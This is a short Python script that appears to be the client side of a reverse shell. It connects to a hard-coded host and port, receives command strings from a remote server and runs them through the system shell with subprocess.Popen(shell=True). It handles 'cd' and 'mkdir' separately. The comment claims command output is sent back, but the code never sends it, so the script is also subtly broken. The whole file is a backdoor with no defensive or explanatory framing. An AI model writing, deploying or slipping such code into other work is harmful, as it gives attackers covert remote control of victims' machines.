import subprocess
import socket
import os

HOST = "0.0.0.0"
PORT = 2982


client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((HOST,PORT))
active = True

while active:
    try:
        #receiving the Input Commands from the server
        command = client.recv(4096).decode('ascii')

        if command[:2] == "cd" and len(command) > 3:
            os.chdir(command[3:])

        if command[:5] == "mkdir" and len(command) > 6:
            os.makedirs(command[6:])

        task = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)

        #decoding and sending back the output[whether it is a valid output or an error output]
        stdout, stderr = task.communicate()
        data = stdout.decode() + stderr.decode()


    except: 
        client.close()
        active = False